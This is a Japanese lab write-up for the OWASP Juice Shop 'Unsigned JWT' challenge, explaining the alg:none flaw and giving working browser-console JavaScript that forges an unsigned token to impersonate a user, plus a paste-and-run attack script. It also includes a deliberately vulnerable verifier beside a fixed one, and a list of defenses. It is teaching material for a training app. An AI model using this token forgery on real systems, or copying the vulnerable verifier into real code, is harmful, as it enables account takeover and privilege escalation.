# Unsigned JWT ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** Broken Authentication
**目標:** 署名なし JWT を使って `jwtn3d@juice-sh.op` になりすます

---

## 背景知識

### JWT (JSON Web Token) とは

JWT は Web アプリケーションで認証情報を安全にやり取りするための標準規格 (RFC 7519)。以下の3つのパートで構成される:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│                                      │                                                                                              │
└──────── ヘッダー ────────┘└───────────────────── ペイロード ─────────────────────┘└──────────────── 署名 ────────────────┘
```

| パート | 内容 | 例 |
|--------|------|-----|
| **ヘッダー** | アルゴリズムとトークンタイプ | `{"alg": "HS256", "typ": "JWT"}` |
| **ペイロード** | ユーザー情報（クレーム） | `{"id": 1, "email": "user@example.com"}` |
| **署名** | 改ざん検知用のデジタル署名 | HMAC-SHA256 または RSA 署名 |

### 署名の役割

```
┌─────────────────────────────────────────────────────────────────┐
│                    正常なJWT検証フロー                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  クライアント                              サーバー              │
│      │                                        │                │
│      │  JWT を送信                            │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │                          1. ヘッダーを読む               │
│      │                          2. 指定されたアルゴリズムで      │
│      │                             署名を検証                   │
│      │                          3. 署名が正しければ             │
│      │                             ペイロードを信頼             │
│      │                                        │                │
│      │  認証成功                              │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 思考プロセス

### ステップ1: JWTの仕様を調査

JWT の RFC 7519 には、アルゴリズムとして `none` が定義されている:

> The "alg" (algorithm) Header Parameter identifies the cryptographic
> algorithm used to secure the JWS. [...] "none" is used for
> unsecured JWSs.

これは署名なしの JWT を意味する。テスト環境や、他の手段で保護されている場合に使用される想定。

### ステップ2: 脆弱性の仮説

```
「もしサーバーが alg ヘッダーをそのまま信頼したら？」
    ↓
「攻撃者が alg: none を指定」
    ↓
「サーバーは署名検証をスキップ」
    ↓
「攻撃者は任意のペイロードを作成可能」
    ↓
「任意のユーザーになりすまし成功」
```

### ステップ3: 攻撃対象の特定

チャレンジ名「Unsigned JWT」と説明から、`jwtn3d@juice-sh.op` というユーザーになりすますことが目標と判明。このユーザー名は "JWT need" の Leet speak。

---

## 実行手順

### Step 1: ユーザー登録

まず `jwtn3d@juice-sh.op` というユーザーを登録する:

```javascript
// ブラウザの Console で実行
await fetch('/api/Users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'jwtn3d@juice-sh.op',
    password: 'password123',
    passwordRepeat: 'password123',
    securityQuestion: { id: 1, question: 'Your eldest siblings middle name?' },
    securityAnswer: 'test'
  })
}).then(r => r.json());
```

### Step 2: 正規トークンの構造を確認

ログインして正規のトークンを確認:

```javascript
// ログインしてトークンを取得
const loginRes = await fetch('/rest/user/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'jwtn3d@juice-sh.op',
    password: 'password123'
  })
}).then(r => r.json());

const token = loginRes.authentication.token;
console.log('Token:', token);

// トークンをデコードして構造を確認
const [header, payload, signature] = token.split('.');
console.log('Header:', JSON.parse(atob(header)));
console.log('Payload:', JSON.parse(atob(payload)));
```

出力例:
```json
Header: { "alg": "RS256", "typ": "JWT" }
Payload: {
  "status": "success",
  "data": {
    "id": 22,
    "username": "",
    "email": "jwtn3d@juice-sh.op",
    "password": "...",
    "role": "customer",
    ...
  },
  "iat": 1706700000,
  "exp": 1706703600
}
```

### Step 3: 署名なしトークンを偽造

```javascript
// Base64URL エンコード関数
function base64url(str) {
  return btoa(str)
    .replace(/=/g, '')      // パディングを削除
    .replace(/\+/g, '-')    // + を - に
    .replace(/\//g, '_');   // / を _ に
}

// ヘッダー: alg を "none" に変更
const forgedHeader = base64url(JSON.stringify({
  "alg": "none",
  "typ": "JWT"
}));

// ペイロード: 対象ユーザーの情報
const forgedPayload = base64url(JSON.stringify({
  "status": "success",
  "data": {
    "id": 22,
    "username": "",
    "email": "jwtn3d@juice-sh.op",
    "password": "...",
    "role": "customer",
    "deluxeToken": "",
    "lastLoginIp": "0.0.0.0",
    "profileImage": "/assets/public/images/uploads/default.svg",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2024-01-31T00:00:00.000Z",
    "updatedAt": "2024-01-31T00:00:00.000Z",
    "deletedAt": null
  },
  "iat": Math.floor(Date.now() / 1000),
  "exp": Math.floor(Date.now() / 1000) + 3600  // 1時間後に期限切れ
}));

// 署名なしトークンを作成（末尾にドットを付ける）
const forgedToken = forgedHeader + '.' + forgedPayload + '.';

console.log('Forged Token:', forgedToken);
```

### Step 4: 偽造トークンでリクエスト

```javascript
// 偽造トークンで whoami を呼び出し
const result = await fetch('/rest/user/whoami', {
  headers: {
    'Authorization': 'Bearer ' + forgedToken
  }
}).then(r => r.json());

console.log('Result:', result);
// → { user: { id: 22, email: "jwtn3d@juice-sh.op", ... } }
```

成功すると、署名なしのトークンでも認証が通り、チャレンジが解決される。

---

## 完全な攻撃コード

```javascript
// ブラウザの Console にコピー&ペーストして実行
(async () => {
  // Base64URL エンコード
  const base64url = (str) => btoa(str).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');

  // 1. ユーザーを登録（既に存在する場合はスキップ）
  try {
    await fetch('/api/Users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: 'jwtn3d@juice-sh.op',
        password: 'test123',
        passwordRepeat: 'test123',
        securityQuestion: { id: 1 },
        securityAnswer: 'test'
      })
    });
  } catch (e) { /* ユーザーが既に存在 */ }

  // 2. 偽造トークンを作成
  const header = base64url(JSON.stringify({ alg: 'none', typ: 'JWT' }));
  const payload = base64url(JSON.stringify({
    status: 'success',
    data: {
      id: 22,
      email: 'jwtn3d@juice-sh.op',
      role: 'customer'
    },
    iat: Math.floor(Date.now() / 1000)
  }));
  const forgedToken = header + '.' + payload + '.';

  // 3. 偽造トークンでリクエスト
  const result = await fetch('/rest/user/whoami', {
    headers: { 'Authorization': 'Bearer ' + forgedToken }
  }).then(r => r.json());

  console.log('Attack successful!', result);
  return result;
})();
```

---

## 解説

### なぜこの攻撃が成功するのか

```
┌─────────────────────────────────────────────────────────────────┐
│                    脆弱なJWT検証フロー                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者                                サーバー                 │
│      │                                    │                    │
│      │  偽造JWT (alg: none)               │                    │
│      │ ─────────────────────────────────▶ │                    │
│      │                                    │                    │
│      │                      1. ヘッダーを読む: alg = "none"     │
│      │                      2. "none" なので署名検証をスキップ  │
│      │                      3. ペイロードをそのまま信頼 ❌      │
│      │                                    │                    │
│      │  認証成功（攻撃成功）              │                    │
│      │ ◀───────────────────────────────── │                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 脆弱なコードパターン

```javascript
// 脆弱な実装
function verifyJWT(token) {
  const [header, payload, signature] = token.split('.');
  const headerObj = JSON.parse(base64Decode(header));

  // ❌ ヘッダーのアルゴリズムをそのまま信頼
  if (headerObj.alg === 'none') {
    return JSON.parse(base64Decode(payload));  // 署名検証をスキップ
  }

  return verifyWithAlgorithm(headerObj.alg, token);
}
```

### 安全な実装

```javascript
// 安全な実装
const ALLOWED_ALGORITHMS = ['RS256', 'HS256'];

function verifyJWT(token) {
  const [header, payload, signature] = token.split('.');
  const headerObj = JSON.parse(base64Decode(header));

  // ✅ 許可されたアルゴリズムのみ受け入れ
  if (!ALLOWED_ALGORITHMS.includes(headerObj.alg)) {
    throw new Error('Invalid algorithm');
  }

  // ✅ サーバー側で決めたアルゴリズムで検証
  return verifyWithAlgorithm(headerObj.alg, token);
}
```

### 実際の被害シナリオ

1. **管理者になりすまし**: ペイロードの `role` を `admin` に変更
2. **他ユーザーのデータにアクセス**: `id` を変更して他人のプロフィールを取得
3. **権限昇格**: `deluxeToken` を偽装してプレミアム機能を利用

### 対策

| 対策 | 説明 |
|------|------|
| **アルゴリズムのホワイトリスト** | `none` を絶対に許可しない |
| **サーバー側でアルゴリズムを固定** | ヘッダーの `alg` を無視する |
| **署名必須の強制** | 署名がない JWT は拒否する |
| **最新ライブラリの使用** | 多くのライブラリはデフォルトで `none` を拒否 |

---

## 参考リンク

- [RFC 7519 - JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [Auth0 - JWT Vulnerabilities](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [OWASP - JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)

## 関連チャレンジ

- [Forged Signed JWT](forged-signed-jwt.md) - RS256 → HS256 アルゴリズム混乱攻撃
- [Login Admin](../difficulty-2/login-admin.md) - SQLi でログイン
